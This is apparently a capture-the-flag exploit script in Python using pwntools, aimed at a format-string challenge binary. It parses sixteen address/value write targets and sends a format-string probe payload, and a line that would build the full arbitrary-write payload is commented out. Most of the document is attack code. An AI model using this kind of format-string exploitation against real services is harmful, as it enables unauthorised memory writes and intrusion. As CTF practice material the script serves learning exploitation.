#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("./write_me_patched")
libc = ELF("./libc.so.6")
gs = """
brva 0x01985
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.sendlineafter(b"Choice? ", b"3")

to_write = {}

for i in range(16):
    p.recvuntil(f'Challenge {i}: Write '.encode())
    value = int(p.recvuntil(b' ').decode(), 0)
    p.recvuntil(b'to address ')
    address = int(p.recvline().decode(), 0)
    to_write[address] = value

# pl = fmtstr_payload(0x13+1, to_write)
pl = b'%p'*10
pl += f'A%p'.encode()
pl = pl.ljust(8, b'\0')
pl += b'A'*8
pl += b'B'*8
pl += b'C'*8
pl += b'D'*8
pl += b'E'*8
pl += b'F'*8
pl += b'H'*8

p.sendlineafter(b"Format string? ", pl)
p.interactive()
